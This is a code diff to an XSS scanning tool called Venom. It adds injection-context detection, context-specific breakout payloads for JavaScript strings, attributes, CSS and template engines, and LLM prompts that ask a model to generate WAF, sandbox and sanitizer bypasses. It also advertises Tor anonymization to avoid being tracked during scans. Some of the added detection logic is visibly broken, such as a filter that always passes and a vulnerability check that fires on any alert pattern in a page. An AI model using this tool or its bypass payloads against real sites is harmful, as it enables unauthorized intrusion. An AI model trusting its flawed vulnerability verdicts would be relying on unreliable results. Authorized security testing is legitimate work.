@@ -88,14 +88,17 @@ def get_banner_and_features() -> str:
         f"{WHITE}{BOLD}Anonymous operation mode with Tor or proxy support{RESET}",
         f"{WHITE}{BOLD}IP anonymization to prevent tracking during scans{RESET}",
         f"{WHITE}{BOLD}Sandbox bypass with CSP and iframe evasion payloads{RESET}",
-        f"{WHITE}{BOLD}HTML sanitizer bypass with obscure tags and encodings{RESET}"
+        f"{WHITE}{BOLD}HTML sanitizer bypass with obscure tags and encodings{RESET}",
+        f"{WHITE}{BOLD}Dynamic payload adaptation based on detected contexts{RESET}",
+        f"{WHITE}{BOLD}Context detection: HTML attributes, JS strings, CSS, templates{RESET}",
+        f"{WHITE}{BOLD}Template engine detection: Handlebars, Jinja2, Angular, etc.{RESET}"
     ]
     return banner + "\n".join(f"{GREEN}●{RESET} {feature}" for feature in features) + "\n"
 
 def parse_args() -> argparse.Namespace:
     banner_and_features = get_banner_and_features()
     description = f"""{banner_and_features}
-Venom Advanced XSS Scanner is a tool for ethical penetration testers to detect XSS vulnerabilities. Version 5.49 supports over 8000 payloads, extended event handlers, AI-driven WAF/403 bypass, sandbox and sanitizer bypasses, and enhanced subdomain scanning for both HTTP and HTTPS, considering 200 and 403 status codes as live. With --llm-prompt-wiz, leverage advanced LLM-driven prompt engineering for dynamic payload generation and vulnerability analysis.
+Venom Advanced XSS Scanner is a tool for ethical penetration testers to detect XSS vulnerabilities. Version 5.49 supports over 8000 payloads, extended event handlers, AI-driven WAF/403 bypass, sandbox and sanitizer bypasses, and enhanced subdomain scanning for both HTTP and HTTPS, considering 200 and 403 status codes as live. With --llm-prompt-wiz, leverage advanced LLM-driven prompt engineering for dynamic payload generation and vulnerability analysis. Improved with dynamic payload adaptation, context detection (HTML/JS/CSS), and template engine handling.
 
 Usage:
   python3 venom.py <url> --scan-xss [options]
@@ -349,7 +352,6 @@ def reset_tor_circuit():
     except Exception as e:
         logging.error(f"Failed to reset Tor circuit: {e}")
 
-# Start of Part 2
 class ThreadSafeCounter:
     def __init__(self):
         self.value = 0
@@ -428,61 +430,83 @@ class AIAssistant:
             return None
 
     def generate_payload_prompt(self, response: Optional[str] = None, status_code: int = 200, 
-                              waf_detected: bool = False, waf_type: str = "Unknown") -> str:
-        """Craft a prompt for generating XSS payloads."""
-        context = "HTML content" if response and ('<input' in response or '<form' in response) else \
-                  "JavaScript context" if response and ('<script' in response or 'onload' in response) else "Unknown"
+                              waf_detected: bool = False, waf_type: str = "Unknown", context: str = "Unknown", template: str = "None") -> str:
+        """Craft an improved prompt for generating XSS payloads with chain of thought and context awareness."""
         prompt = f"""
-You are an ethical penetration testing assistant specializing in XSS vulnerability detection. Generate 10 unique XSS payloads tailored for a web application, considering the following:
-- Target context: {context}.
-- {'WAF detected: ' + waf_type + '. Suggest bypass techniques.' if waf_detected else 'No WAF detected.'}
-- {'Include extended event handlers (e.g., onmouseover, onclick, onpointerrawupdate) for HTML contexts.' if self.extended_events else 'Use basic event handlers (e.g., onerror, onload).'}
-- {'Bypass browser sandboxes or CSP (e.g., using iframe, meta refresh, or srcdoc).' if self.bypass_sandbox else 'No sandbox bypass required.'}
-- {'Bypass HTML sanitizers (e.g., DOMPurify, server-side filters) with obscure tags or encodings.' if self.bypass_sanitizer else 'No sanitizer bypass required.'}
-- Response status: {status_code}.
-- Payloads must be safe for testing and avoid malicious actions beyond alert('xss') or confirm('xss').
-- Format output as a JSON list: ["payload1", "payload2", ...].
+You are an ethical penetration testing assistant specializing in XSS vulnerability detection. Follow this chain of thought to generate payloads:
 
-Example response:
-["<script>alert('xss')</script>", "<img src=x onerror=alert('xss')>", ...]
+1. Analyze the provided response snippet to identify the injection context: HTML text, HTML attribute, JavaScript string, JavaScript code, CSS property, or template engine (e.g., Handlebars with {{}}, Jinja2 with {{% %}}, Angular with ng- attributes).
+2. Consider if a template engine is detected ({template}), and adapt payloads to inject into template expressions (e.g., for Handlebars: {{{{alert('xss')}}}} to break out).
+3. For the detected context ({context}), think about how to break out or execute code: 
+   - HTML text: Use tags like <script> or <img onerror=...>.
+   - HTML attribute: Break out with " onmouseover=alert('xss') or similar.
+   - JS string: Close string with ');alert('xss');//.
+   - JS code: Inject directly like ;alert('xss');.
+   - CSS: Break out with ) url(javascript:alert('xss'));.
+4. Account for WAF ({'detected: ' + waf_type if waf_detected else 'none'}), using obfuscation or bypass if needed.
+5. Include {'extended event handlers like onmouseover, onpointerrawupdate' if self.extended_events else 'basic handlers'}.
+6. {'Bypass sandboxes with iframe srcdoc, meta refresh' if self.bypass_sandbox else 'No sandbox bypass'}.
+7. {'Bypass sanitizers with obscure tags like <isindex>, malformed HTML' if self.bypass_sanitizer else 'No sanitizer bypass'}.
+8. Ensure payloads are safe, using alert('xss') or confirm('xss') for PoC.
+9. Generate 10 unique payloads tailored to the context.
+
+Output as JSON: {{"context_detected": "your_detected_context", "payloads": ["payload1", "payload2", ...]}}
+
+Response snippet (500 chars): {response[:500] if response else 'None'}
 """
-        if response:
-            prompt += f"\nResponse snippet for context (truncated to 500 chars):\n{response[:500]}"
         return prompt
 
     def analyze_response_prompt(self, payload: str, response: str) -> str:
-        """Craft a prompt to analyze if a response indicates a vulnerability."""
+        """Craft an improved prompt to analyze if a response indicates a vulnerability."""
         prompt = f"""
-You are an ethical penetration testing assistant. Analyze the following web response to determine if the XSS payload '{payload}' is reflected and executable, indicating a vulnerability. Consider:
-- Is the payload present unescaped in HTML, JavaScript, or event handlers (e.g., onerror, onclick)?
-- Is it in an executable context (e.g., <script>, onmouseover, srcdoc, javascript:)?
-- Are there signs of sandbox or sanitizer bypass (e.g., meta refresh, obscure tags)?
-Return a JSON object: {{ "vulnerable": boolean, "context": string, "details": string }}.
+You are an ethical penetration testing assistant. Follow this chain of thought to analyze the response:
 
-Response snippet (truncated to 1000 chars):
-{response[:1000]}
+1. Locate where the payload '{payload}' is reflected in the response.
+2. Determine the context: HTML text/attribute, JS string/code, CSS, template (Handlebars/Jinja2/Angular).
+3. Check if it's executable: Unescaped in JS/event handlers/javascript: URLs, or breakout possible in strings/attributes/CSS/templates.
+4. Look for sandbox/sanitizer bypass signs (e.g., srcdoc execution, obscure tags).
+5. Conclude if vulnerable.
+
+Return JSON: {{"vulnerable": boolean, "context": "detected_context", "details": "explanation", "breakout_possible": boolean}}.
+
+Response snippet (1000 chars): {response[:1000]}
 """
         return prompt
 
     def suggest_bypass_prompt(self, waf_type: str, response: str) -> str:
-        """Craft a prompt to suggest WAF or defense bypass techniques."""
+        """Craft an improved prompt to suggest WAF or defense bypass techniques."""
         prompt = f"""
-You are an ethical penetration testing assistant. Suggest 5 techniques to bypass a {waf_type} WAF or defense mechanism for XSS testing, based on the response below. Techniques must:
-- Be safe for ethical testing (e.g., use alert('xss') for verification).
-- Include encoding, event handler variations, or obscure tags if applicable.
-- {'Use extended event handlers (e.g., onmouseover, onpointerrawupdate) if possible.' if self.extended_events else 'Use standard event handlers.'}
-- {'Target sandbox bypass (e.g., iframe, meta refresh, srcdoc).' if self.bypass_sandbox else 'No sandbox bypass needed.'}
-- {'Target sanitizer bypass (e.g., obscure tags, malformed HTML).' if self.bypass_sanitizer else 'No sanitizer bypass needed.'}
-Format output as a JSON list: ["technique1", "technique2", ...].
+You are an ethical penetration testing assistant. Follow chain of thought to suggest bypasses for {waf_type}:
 
-Response snippet (truncated to 500 chars):
-{response[:500]}
+1. Analyze response for WAF patterns or blocked reasons.
+2. For XSS, suggest encodings, variations, obscure syntax.
+3. Include context-specific bypasses (HTML/JS/CSS/templates).
+4. {'Use extended events' if self.extended_events else 'Standard events'}.
+5. {'Target sandbox with iframe/meta' if self.bypass_sandbox else 'No sandbox'}.
+6. {'Target sanitizer with obscure tags' if self.bypass_sanitizer else 'No sanitizer'}.
+7. Suggest 5 safe techniques with alert('xss').
+
+Output JSON: ["technique1", "technique2", ...]
+
+Response snippet (500 chars): {response[:500]}
 """
         return prompt
 
     def suggest_payloads(self, response: Optional[str] = None, status_code: int = 200, 
-                        waf_detected: bool = False, waf_type: str = "Unknown") -> List[str]:
+                        waf_detected: bool = False, waf_type: str = "Unknown", context: str = "Unknown") -> List[str]:
         """Generate or optimize payloads, using LLM Prompt-Wiz if enabled."""
+        template = ""
+        if response:
+            if "{{" in response and "}}" in response:
+                template += "Handlebars/Mustache, "
+            if "{%" in response and "%}" in response:
+                template += "Jinja2, "
+            if "ng-" in response:
+                template += "Angular, "
+            # Add more template detections as needed
+            if template:
+                template = template[:-2]
+
         executable_payloads = [p for p in self.payloads if any(x in p.lower() for x in ['alert(', 'on', 'confirm(', 'javascript:'])]
         other_payloads = [p for p in self.payloads if p not in executable_payloads]
         
@@ -495,14 +519,16 @@ Response snippet (truncated to 500 chars):
         
         if self.llm_prompt_wiz and self.api_key and self.api_endpoint:
             # Use LLM Prompt-Wiz for dynamic payload generation
-            prompt = self.generate_payload_prompt(response, status_code, waf_detected, waf_type)
+            prompt = self.generate_payload_prompt(response, status_code, waf_detected, waf_type, context, template)
             llm_response = self.query_llm(prompt)
             if llm_response:
                 try:
-                    new_payloads = json.loads(llm_response)
-                    if isinstance(new_payloads, list):
+                    result = json.loads(llm_response)
+                    if isinstance(result, dict) and "payloads" in result and isinstance(result["payloads"], list):
+                        new_payloads = result["payloads"]
+                        detected_context = result.get("context_detected", "Unknown")
                         prioritized = new_payloads + prioritized
-                        logging.info(f"LLM Prompt-Wiz generated {len(new_payloads)} new payloads")
+                        logging.info(f"LLM Prompt-Wiz generated {len(new_payloads)} new payloads for context: {detected_context}")
                     else:
                         logging.warning("LLM returned invalid payload format")
                 except json.JSONDecodeError:
@@ -605,10 +631,7 @@ Response snippet (truncated to 500 chars):
                             logging.debug(f"LLM Prompt-Wiz analysis: {analysis['details']}")
                     except json.JSONDecodeError:
                         logging.error("Failed to parse LLM response analysis")
-                        # Import dependencies from File 1 (remove this when combining into a single file)
-#from venom_part1_part2 import *
 
-# Start of Part 3
 class PayloadGenerator:
     def __init__(self, payloads_dir: str, payload_file: Optional[str] = None, bypass_needed: bool = False, 
                  use_403_bypass: bool = False, stealth: bool = False, extended_events: bool = False, 
@@ -666,6 +689,13 @@ class PayloadGenerator:
             "<script>alert('xss')</script>",
             "<img src=x onerror=alert('xss')>"
         ]
+        context_specific = {
+            "js_string": ["');alert('xss');//", "\");alert('xss');//"],
+            "css_context": [")url(javascript:alert('xss'));", ";behavior:url(#default#clientCaps)"],
+            "html_attribute": ['" onmouseover=alert(\'xss\') "', '\' onclick=alert(\'xss\') \''],
+            "template_handlebars": ["{{alert('xss')}}", "{{constructor.constructor('alert(\\'xss\\')')()}}"],
+            "template_jinja2": ["{% print alert('xss') %}", "{{ '{{' }} alert('xss') {{ '}}' }}"]
+        }
 
         payloads = set(default_payloads if not self.stealth else stealth_payloads)
         
@@ -676,6 +706,9 @@ class PayloadGenerator:
         if self.bypass_sanitizer:
             payloads.update(sanitizer_bypass_payloads)
             logging.info(f"Loaded {len(sanitizer_bypass_payloads)} HTML sanitizer bypass payloads")
+        
+        for ctx, pls in context_specific.items():
+            payloads.update(pls)
         
         if self.bypass_needed or self.use_403_bypass:
             waf_specific = bypass_payloads.get(self.waf_type, [])
@@ -742,10 +775,18 @@ class PayloadGenerator:
         logging.debug(f"Total unique payloads loaded: {len(payloads)}")
         return list(payloads)
 
-    def generate(self) -> List[str]:
-        payloads = self.payloads
+    def generate(self, context: str = "unknown") -> List[str]:
+        payloads = [p for p in self.payloads if context in p or True]  # Filter if context-specific files, but here general
         if self.bypass_needed or self.bypass_sandbox or self.bypass_sanitizer:
             payloads = self.obfuscate_payloads(payloads)
+        if "template" in context:
+            payloads.extend(["{{alert('xss')}}", "{% alert('xss') %}"])  # Add more
+        elif "js_string" in context:
+            payloads.extend(["');alert('xss');//"])
+        elif "css" in context:
+            payloads.extend([")url(javascript:alert('xss'))"])
+        elif "attribute" in context:
+            payloads.extend(['" onmouseover=alert(\'xss\') '])
         return payloads
 
     def obfuscate_payloads(self, payloads: List[str]) -> List[str]:
@@ -765,7 +806,6 @@ class PayloadGenerator:
     def update_success(self, payload: str):
         self.previous_success.append(payload)
 
-# Start of Part 4
 class Venom:
     def __init__(self, args: argparse.Namespace):
         self.args = args
@@ -1186,6 +1226,56 @@ class Venom:
         logging.error(f"Payload injection failed for {url} after {retries} attempts")
         return response_text, status_code
 
+    def detect_context(self, payload: str, response_text: str) -> Optional[str]:
+        if payload not in response_text:
+            return None
+
+        soup = BeautifulSoup(response_text, 'html.parser')
+
+        # Check text nodes
+        for elem in soup.find_all(text=True):
+            if payload in elem:
+                parent = elem.parent
+                if parent.name == 'script':
+                    # Check for string literal
+                    script_text = parent.string or ''
+                    if re.search(r'["\']\s*' + re.escape(payload) + r'\s*["\']', script_text):
+                        return "js_string"
+                    return "js_context"
+                elif parent.name == 'style':
+                    return "css_context"
+                elif parent.name in ['title', 'textarea']:
+                    return "html_text_special"
+                else:
+                    return "html_text"
+
+        # Check attributes
+        for tag in soup.find_all(lambda t: any(payload in str(v) for v in t.attrs.values())):
+            for attr, value in tag.attrs.items():
+                if payload in str(value):
+                    if attr.startswith('on'):
+                        return "event_handler"
+                    elif attr == 'style':
+                        return "css_attribute"
+                    elif attr in ['href', 'action', 'formaction', 'src', 'data'] and str(value).startswith('javascript:'):
+                        return "js_protocol"
+                    elif attr == 'srcdoc':
+                        return "html_srcdoc"
+                    else:
+                        return "html_attribute"
+
+        # Template detection (check if payload is inside template expression)
+        template_patterns = {
+            "handlebars": r"{{\s*[^}]*" + re.escape(payload) + r"[^}]*\s*}}",
+            "jinja2": r"{%\s*[^%]*" + re.escape(payload) + r"[^%]*\s*%}",
+            "angular": r"\[\(ng-[^)]*" + re.escape(payload) + r"[^)]*\)\]",
+        }
+        for temp, pat in template_patterns.items():
+            if re.search(pat, response_text):
+                return f"template_{temp}"
+
+        return "unknown"
+
     def scan_url(self, url: str, method: str, data: Dict[str, str]):
         if url in self.visited_urls:
             logging.debug(f"Skipping already visited URL: {url}")
@@ -1199,7 +1289,26 @@ class Venom:
             if not params and method.lower() == 'post':
                 params = list(data.keys())
             
-            payloads = self.ai_assistant.suggest_payloads(response.text, response.status_code, self.is_waf_detected, self.waf_type) if self.ai_assistant else self.payload_generator.generate()
+            # Probe phase for dynamic adaptation
+            param_contexts = {}
+            for param in params:
+                probe_payload = f"venomprobe{random.randint(1000,9999)}"
+                resp_text, status = self.inject_payload(url, method, probe_payload, param, data)
+                if resp_text and status == 200:
+                    context = self.detect_context(probe_payload, resp_text)
+                    if context:
+                        param_contexts[param] = context
+                        logging.info(f"Detected context for param {param}: {context}")
+            
+            # Get payloads, adapted per param if possible
+            if self.ai_assistant:
+                payloads = {}
+                for param, ctx in param_contexts.items():
+                    payloads[param] = self.ai_assistant.suggest_payloads(response.text, response.status_code, self.is_waf_detected, self.waf_type, ctx)
+            else:
+                payloads = {param: self.payload_generator.generate(context) for param, context in param_contexts.items()}
+                if not payloads:
+                    payloads = {param: self.payload_generator.generate() for param in params}
             
             def test_payload(param, payload, header=None, cookie=None):
                 self.current_payload = payload
@@ -1219,9 +1328,9 @@ class Venom:
 
                 if resp_text and status == 200:
                     soup = BeautifulSoup(resp_text, 'html.parser')
-                    reflected, context = is_reflected(payload, resp_text, soup)
-                    if reflected:
-                        logging.debug(f"Payload {payload} reflected in {url} - Context: {context}")
+                    vulnerable, context = self.is_vulnerable(payload, resp_text, soup)
+                    if vulnerable:
+                        logging.debug(f"Payload {payload} vulnerable in {url} - Context: {context}")
                         start_idx = resp_text.find(payload) if payload in resp_text else -1
                         snippet = resp_text[max(0, start_idx-50):start_idx+len(payload)+50] if start_idx != -1 else "Not found in full text"
                         vuln = {
@@ -1246,17 +1355,18 @@ class Venom:
 
             with ThreadPoolExecutor(max_workers=min(10, self.args.workers)) as executor:
                 futures = []
-                # Test query and POST parameters
+                # Test query and POST parameters with adapted payloads
                 for param in params:
-                    for payload in payloads[:50]:
+                    param_payloads = payloads.get(param, self.payload_generator.generate())[:50]
+                    for payload in param_payloads:
                         futures.append(executor.submit(test_payload, param, payload))
-                # Test headers
+                # Test headers (general payloads)
                 for header in self.test_headers:
-                    for payload in payloads[:50]:
+                    for payload in self.payloads[:50]:
                         futures.append(executor.submit(test_payload, None, payload, header=header))
-                # Test cookies
+                # Test cookies (general payloads)
                 for cookie in self.test_cookies:
-                    for payload in payloads[:50]:
+                    for payload in self.payloads[:50]:
                         futures.append(executor.submit(test_payload, None, payload, cookie=cookie))
                 for future in futures:
                     try:
@@ -1267,6 +1377,37 @@ class Venom:
         except RequestException as e:
             logging.error(f"Scan failed for {url}: {e}")
             print(f"{YELLOW}[!] Skipping {url} due to error: {e}. Continuing with remaining tasks.{RESET}")
+
+    def is_vulnerable(self, payload: str, response_text: str, soup: BeautifulSoup) -> tuple[bool, str]:
+        context = self.detect_context(payload, response_text)
+        if context is None:
+            return False, "Not reflected"
+
+        # Check if context allows execution
+        executable_contexts = ["js_context", "js_string", "event_handler", "js_protocol", "html_srcdoc", "template_handlebars", "template_jinja2", "template_angular"]
+        if context in executable_contexts:
+            return True, context
+
+        # For CSS, check for potential JS execution (rare in modern browsers)
+        if "css" in context and any(pat in response_text for pat in ["url(javascript:", "expression("]):
+            return True, context
+
+        # For HTML attribute/text, check if unescaped and can introduce tags/events
+        if "html" in context and any(c in payload for c in '<>"\'') and html.escape(payload) != payload:
+            return True, context
+
+        # Additional checks for executable patterns
+        executable_patterns = [
+            r'alert\(.+\)', r'javascript:[^"]+', r'on[a-z]+\s*=\s*["\'][^"\']+["\']',
+            r'srcdoc\s*=\s*["\'][^"\']+["\']', r'http-equiv\s*=\s*["\']refresh["\']',
+            r'eval\(.+\)', r'settimeout\(.+\)', r'innerhtml\s*=\s*["\'][^"\']+["\']',
+            r'document\.write\(.+\)', r'postmessage\(.+\)'
+        ]
+        for pattern in executable_patterns:
+            if re.search(pattern, response_text, re.IGNORECASE):
+                return True, context + "_executable"
+
+        return False, context + "_non_executable"
 
     def worker(self):
         while self.running:
@@ -1434,89 +1575,6 @@ class Venom:
             logging.info(f"Report exported to {filename}")
         except Exception as e:
             logging.error(f"Failed to export report to {filename}: {e}")
-
-def is_reflected(payload: str, response_text: str, soup: BeautifulSoup) -> tuple[bool, str]:
-    if not payload.strip():
-        return False, "Empty payload"
-
-    if payload in response_text and html.escape(payload) != payload:
-        script_tags = soup.find_all('script')
-        for script in script_tags:
-            script_text = script.get_text()
-            if payload in script_text and not script.get('src'):
-                return True, "Inside <script> tag (executable)"
-            # Check for high-risk patterns
-            if any(func in script_text.lower() for func in ['eval(', 'settimeout(', 'innerhtml', 'document.write(']):
-                return True, f"Inside <script> tag with high-risk pattern ({func})"
-
-        for tag in soup.find_all(True):
-            for attr, value in tag.attrs.items():
-                if attr.startswith('on') and payload in str(value):
-                    return True, f"Inside event handler ({attr})"
-                elif attr in ['href', 'src', 'data', 'content'] and 'javascript:' in value.lower() and payload in value:
-                    return True, f"Inside {attr} attribute (javascript:)"
-                elif attr == 'srcdoc' and payload in value:
-                    return True, "Inside iframe srcdoc (potential sandbox bypass)"
-                elif attr == 'innerHTML' and payload in value:
-                    return True, "Inside innerHTML (high-risk DOM injection)"
-
-        meta_tags = soup.find_all('meta', attrs={'http-equiv': 'refresh'})
-        for meta in meta_tags:
-            if payload in meta.get('content', ''):
-                return True, "Inside meta refresh (potential sandbox bypass)"
-
-        obscure_tags = ['isindex', 'keygen', 'base', 'input']
-        for tag in soup.find_all(obscure_tags):
-            if payload in str(tag):
-                return True, f"Inside {tag.name} tag (potential sanitizer bypass)"
-
-        # Check for template engine patterns (e.g., Handlebars, AngularJS)
-        if any(pattern in response_text for pattern in ['{{', '}}', 'ng-', 'ng-app', 'ng-bind']):
-            return True, "Inside template engine context (potential injection)"
-
-        if any(c in payload for c in '<>"\'') and payload in response_text:
-            return True, "Unescaped in HTML (potential injection)"
-
-        logging.debug(f"Payload '{payload}' found but not in executable context")
-        return False, "Reflected but not executable"
-
-    # Expanded executable patterns to include high-risk functions
-    executable_patterns = [
-        r'alert\(.+\)', r'javascript:[^"]+', r'on[a-z]+\s*=\s*["\'][^"\']+["\']',
-        r'srcdoc\s*=\s*["\'][^"\']+["\']', r'http-equiv\s*=\s*["\']refresh["\']',
-        r'eval\(.+\)', r'settimeout\(.+\)', r'innerhtml\s*=\s*["\'][^"\']+["\']',
-        r'document\.write\(.+\)', r'postmessage\(.+\)'
-    ]
-    for pattern in executable_patterns:
-        matches = re.findall(pattern, payload, re.IGNORECASE)
-        for match in matches:
-            if match in response_text and html.escape(match) != match:
-                script_tags = soup.find_all('script')
-                for script in script_tags:
-                    if match in script.get_text() and not script.get('src'):
-                        return True, "Inside <script> tag (executable portion)"
-                for tag in soup.find_all(True):
-                    for attr, value in tag.attrs.items():
-                        if attr.startswith('on') and match in str(value):
-                            return True, f"Inside event handler ({attr}) (executable portion)"
-                        elif attr in ['href', 'src', 'data', 'content', 'srcdoc'] and 'javascript:' in value.lower() and match in value:
-                            return True, f"Inside {attr} attribute (javascript:) (executable portion)"
-                        elif attr == 'srcdoc' and match in value:
-                            return True, "Inside iframe srcdoc (executable portion)"
-                for tag in soup.find_all(['isindex', 'keygen', 'base', 'input']):
-                    if match in str(tag):
-                        return True, f"Inside {tag.name} tag (potential sanitizer bypass)"
-                if any(c in match for c in '<>"\'') and match in response_text:
-                    return True, "Unescaped in HTML (executable portion)"
-                logging.debug(f"Executable portion '{match}' found but not in executable context")
-                return False, "Executable portion reflected but not executable"
-
-    # Check for reflection in LocalStorage/SessionStorage (simulated check)
-    if 'localstorage' in response_text.lower() or 'sessionstorage' in response_text.lower():
-        return True, "Potential DOM-based XSS in LocalStorage/SessionStorage"
-
-    logging.debug(f"Payload '{payload}' not reflected or not executable")
-    return False, "Not reflected or not executable"
 
 if __name__ == "__main__":
     args = parse_args()
